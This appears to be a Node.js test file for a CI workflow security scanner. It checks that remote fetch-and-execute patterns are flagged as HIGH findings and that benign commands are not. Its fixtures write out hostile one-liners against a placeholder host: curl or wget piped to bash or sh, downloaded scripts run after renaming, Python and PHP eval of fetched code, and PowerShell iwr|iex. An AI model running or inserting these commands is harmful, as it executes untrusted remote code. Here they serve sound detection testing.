'use strict';
// Seven Codex P1 root-family regressions; fixture strings never execute.
const test=require('node:test');
const assert=require('node:assert/strict');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const D='https://example.invalid/payload';
function audit(cmd,shell){
 const y=['on: push','permissions: read-all','jobs:','  review:',
 '    runs-on: ubuntu-latest','    steps:','      - run: |',
 ...cmd.split('\n').map(s=>'          '+s),
 ...(shell?['        shell: '+shell]:[])].join('\n')+'\n';
 return inspectWorkflow(y,{path:'.github/workflows/codex-seven.yml'});
}
const cases=[
 ['output-long','REMOTE_DOWNLOADED_FILE_EXECUTION',
  'curl -fsSL '+D+' --output run.sh; bash run.sh'],
 ['output-long-equals','REMOTE_DOWNLOADED_FILE_EXECUTION',
  'curl -fsSL '+D+' --output=run.sh\nsh ./run.sh'],
 ['path-dotdot','REMOTE_DOWNLOADED_FILE_EXECUTION',
  'mkdir -p dir; curl -fsSL '+D+' -o dir/../run.sh; bash run.sh'],
 ['path-multidot','REMOTE_DOWNLOADED_FILE_EXECUTION',
  'mkdir -p a/b; curl -fsSL '+D+' -o a/b/../../run.sh\nbash ./run.sh'],
 ['alias-symbolic','REMOTE_DOWNLOADED_FILE_EXECUTION',
  'curl -fsSL '+D+' -o payload; ln -s payload run.sh; bash run.sh'],
 ['alias-copy','REMOTE_DOWNLOADED_FILE_EXECUTION',
  'curl -fsSL '+D+' -o payload; cp payload run.sh; bash run.sh'],
 ['alias-mv','REMOTE_DOWNLOADED_FILE_EXECUTION',
  'curl -fsSL '+D+' -o payload; mv payload run.sh; sh run.sh'],
 ['heredoc-background','REMOTE_INTERPRETER_FETCH_EXECUTION',
  "python - <<'PY' &\nimport urllib.request\nu='"+D+"'\nexec(urllib.request.urlopen(u).read())\nPY\nwait"],
 ['heredoc-semicolon','REMOTE_INTERPRETER_FETCH_EXECUTION',
  "python - <<'PY' ;\nimport urllib.request\nu='"+D+"'\nexec(urllib.request.urlopen(u).read())\nPY"],
 ['php-http-eval','REMOTE_INTERPRETER_FETCH_EXECUTION',
  "php -r 'eval(file_get_contents(\""+D+"\"));'"],
 ['php-file-source','REMOTE_INTERPRETER_FETCH_EXECUTION',
  "php -r 'eval(file_get_contents(\""+D+"\"));'"],
 ['bash-aliased-curl','REMOTE_SHELL_PIPELINE',
  'shopt -s expand_aliases\nalias c=curl\nc -fsSL '+D+' | bash'],
 ['bash-aliased-wget','REMOTE_SHELL_PIPELINE',
  'shopt -s expand_aliases\nalias w=wget\nw -qO- '+D+' | sh'],
 ['pwsh-shell-inline','REMOTE_POWERSHELL_EXECUTION',
  'iwr '+D+' | iex','pwsh'],
 ['pwsh-shell-long','REMOTE_POWERSHELL_EXECUTION',
  'Invoke-WebRequest '+D+' | Invoke-Expression','pwsh'],
 ['powershell-shell-short','REMOTE_POWERSHELL_EXECUTION',
  'irm '+D+' | iex','powershell']
];
for(const [name,rule,cmd,shell] of cases){
 test('Codex seven families '+name+' must block explicit danger',()=>{
  const got=audit(cmd,shell);
  assert.ok(got.findings.some(f=>f.rule===rule&&f.severity==='HIGH')||got.status==='INCOMPLETE',
    name+' => '+JSON.stringify(got));
 });
}
for(const [name,cmd,shell] of [
 ['curl-only','curl --output run.sh '+D],
 ['safe-php','php -r \'echo "local";\''],
 ['benign-path','curl -o a/b/data.txt '+D+'; echo downloaded'],
 ['safe-pwsh','Write-Host "iwr '+D+' | iex"','pwsh'],
 ['local-script','bash run.sh'],
 ['unresolved-alias','alias c=echo\nc "hello"']
]){
 test('Codex seven families benign '+name+' does not produce remote-exec HIGH',()=>{
  const result=audit(cmd,shell);
  assert.ok(!result.findings.some(f=>f.severity==='HIGH'&&
   /^REMOTE_/.test(f.rule)),name+' => '+JSON.stringify(result));
 });
}
